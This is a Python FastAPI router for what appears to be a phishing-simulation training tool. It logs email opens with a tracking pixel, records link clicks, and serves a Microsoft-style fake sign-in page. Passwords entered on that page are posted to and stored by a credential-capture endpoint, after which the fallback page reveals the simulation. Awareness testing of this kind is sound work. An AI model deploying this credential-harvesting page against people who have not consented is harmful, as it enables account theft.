from fastapi import APIRouter, Request, HTTPException, Response
from fastapi.responses import HTMLResponse
from app.services.tracking_service import tracking_service
from pydantic import BaseModel
from typing import Optional
import os

router = APIRouter()

class CredentialCaptureRequest(BaseModel):
    tracking_id: str
    password: str
    metadata: Optional[dict] = None

@router.get("/open/{tracking_id}")
async def track_open(tracking_id: str, request: Request):
    await tracking_service.log_event(
        tracking_id=tracking_id,
        event_type="email_opened",
        ip_address=request.client.host if request.client else "",
        user_agent=request.headers.get("user-agent", "")
    )
    pixel = (
        b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff"
        b"\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00"
        b"\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
    )
    return Response(content=pixel, media_type="image/gif")

@router.get("/click/{tracking_id}")
async def track_click(tracking_id: str, request: Request):
    sim = await tracking_service.log_event(
        tracking_id=tracking_id,
        event_type="link_clicked",
        ip_address=request.client.host if request.client else "",
        user_agent=request.headers.get("user-agent", "")
    )
    
    if not sim:
        raise HTTPException(status_code=404, detail="Invalid tracking ID")

    stats = await tracking_service.get_tracking_stats(tracking_id)

    # Serve a realistic phishing landing page with tracking_id injected
    template_path = os.path.join(os.path.dirname(__file__), "..", "..", "..", "templates", "phishing", "microsoft_login.html")
    template_path = os.path.normpath(template_path)
    
    if os.path.exists(template_path):
        with open(template_path, "r", encoding="utf-8") as f:
            html_content = f.read()
            # Inject tracking_id so the credential form can reference it
            html_content = html_content.replace("{{TRACKING_ID}}", tracking_id)
            response = HTMLResponse(content=html_content)
            if stats:
                response.headers["X-Link-Clicked-Count"] = str(stats.get("link_clicked", 0))
            return response

    # Fallback: simple HTML page with credential form
    response = HTMLResponse(content=f"""
    <!DOCTYPE html>
    <html>
    <head><title>Sign in - Security Verification</title>
    <style>
        body {{ font-family: 'Segoe UI', sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .box {{ background: white; padding: 40px; width: 360px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); border-radius: 4px; }}
        h1 {{ font-size: 22px; color: #1b1b1b; margin-bottom: 8px; }}
        input {{ width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 14px; font-size: 14px; box-sizing: border-box; }}
        .btn {{ background: #0067b8; color: white; padding: 10px 32px; border: none; font-size: 14px; cursor: pointer; border-radius: 4px; width: 100%; }}
        .btn:hover {{ background: #005da6; }}
        .warn {{ background: #fff4e5; border: 1px solid #ffd54f; padding: 12px; margin-top: 16px; border-radius: 4px; font-size: 12px; color: #5d4037; }}
    </style>
    </head>
    <body>
    <div class="box">
        <h1>Verify Your Identity</h1>
        <p style="font-size:14px;color:#555;margin-bottom:20px;">Please enter your credentials to continue.</p>
        <form id="credForm">
            <input type="email" id="email" placeholder="Email address" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn">Sign In</button>
        </form>
        <div class="warn" id="result" style="display:none;"></div>
    </div>
    <script>
        document.getElementById('credForm').onsubmit = function(e) {{
            e.preventDefault();
            var pwd = document.getElementById('password').value;
            fetch('/api/v1/tracking/credentials', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{
                    tracking_id: '{tracking_id}',
                    password: pwd,
                    metadata: {{ source: 'fallback_template' }}
                }})
            }}).then(function() {{
                var r = document.getElementById('result');
                r.style.display = 'block';
                r.innerHTML = '⚠️ This was a <b>phishing simulation</b>. You entered your credentials on a fake page. In a real attack, your account would be compromised. Always check the URL before entering passwords.';
                document.getElementById('credForm').style.display = 'none';
            }});
        }};
    </script>
    </body>
    </html>
    """)
    if stats:
        response.headers["X-Link-Clicked-Count"] = str(stats.get("link_clicked", 0))
    return response

@router.post("/credentials")
async def track_credentials(payload: CredentialCaptureRequest, request: Request):
    metadata = payload.metadata or {}
    metadata.update({
        "ip_address": request.client.host if request.client else "",
        "user_agent": request.headers.get("user-agent", "")
    })
    
    result = await tracking_service.capture_credentials(
        tracking_id=payload.tracking_id,
        password=payload.password,
        metadata=metadata
    )
    
    if not result:
        raise HTTPException(status_code=404, detail="Invalid tracking ID")
        
    return result

@router.get("/stats/{tracking_id}")
async def tracking_stats(tracking_id: str):
    stats = await tracking_service.get_tracking_stats(tracking_id)
    if not stats:
        raise HTTPException(status_code=404, detail="Invalid tracking ID")
    return stats
